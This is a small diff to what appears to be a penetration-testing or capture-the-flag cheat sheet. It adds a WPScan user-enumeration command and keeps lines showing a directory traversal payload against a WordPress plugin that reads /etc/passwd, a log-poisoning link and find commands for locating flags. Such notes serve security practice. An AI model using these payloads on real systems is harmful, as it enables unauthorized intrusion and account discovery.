@@ -3,6 +3,7 @@ web
 	check http://192.168.1.27/info.php
 	directory traversal wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/passwd
 	poisoning logs https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1
+	wp scan: docker run -it --rm wpscanteam/wpscan --url https://target.tld/ --enumerate u
 find
 	find / -exec cat {} \; grep flag
 	find / -type f -exec grep -H 'text-to-find-here' {} \;
